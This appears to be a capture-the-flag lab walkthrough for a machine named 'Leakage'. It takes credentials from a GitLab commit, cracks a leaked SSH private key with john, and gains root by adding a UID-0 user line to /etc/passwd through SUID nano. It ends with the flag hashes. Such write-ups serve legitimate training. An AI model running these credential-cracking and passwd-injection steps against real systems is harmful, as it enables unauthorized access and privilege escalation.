# Leakage

**IP Address:** 172.31.1.6

## Enumeration
### Open Ports
| Port | State | Service | Version |
|------|-------|---------|---------|
| 22/tcp | open | ssh | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80/tcp | open | http | nginx  |
| 8060/tcp | open | http | nginx 1.16.1 |
| 9094/tcp | open | [service.name] | [service.product] [service.version] |
| 1434/udp | open|filtered | ms-sql-m |   |
| 1900/udp | open|filtered | upnp |   |
| 4500/udp | open|filtered | nat-t-ike |   |
| 68/udp | open|filtered | dhcpc |   |

## Exploitation
### Exploit Details (Found Credentials)
* **Name** - Found Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

1. Create an account and log into the Gitlab website located http://172.31.1.6/ check the CMS repository and find a recent commit related to the config file. Here we find some credentials for the user jonathan. 

![Execute Exploit](images/exploit1.png)

2. Log in using jonathan's credentials. Navigate to http://172.31.1.6/jonathan/security/-/blob/master/id_rsa and find a private key that has been left in the security repository. 

![Execute Exploit](images/exploit2.png)

3. Save the private key to a file on the attack box. Crack the hash of the private key and use it to login to the server as jonathan. 

Commands
```
ssh2john.py id_rsa > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
chmod 600 id_rsa
ssh jonathan@$ip -i id_rsa
whoami
cat access.txt
```

![Execute Exploit](images/exploit3.png)

## Privilege Escalation
### Exploit Details (SUID (nano))
* **Name** - SUID (nano)
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

Edit the /etc/passwd file and add a new user. Then we can change to the new user to get root permissions. 

Commands
```bash
nano /etc/passwd
hack:$1$hack$oVoeBx1ggpFlos.3757hz0:0:0:root:/root:/bin/bash
su hack
123
whoami
cat /root/system.txt
```
![Execute Exploit](images/privesc1.png)

![Execute Exploit](images/privesc2.png)

![Execute Exploit](images/privesc3.png)

## Loot
```
access.txt
43d72a36c51d97e8aef93a6e90e4e493
system.txt
933f9f8ba314ab4c8c332ccbbb5f2af1
```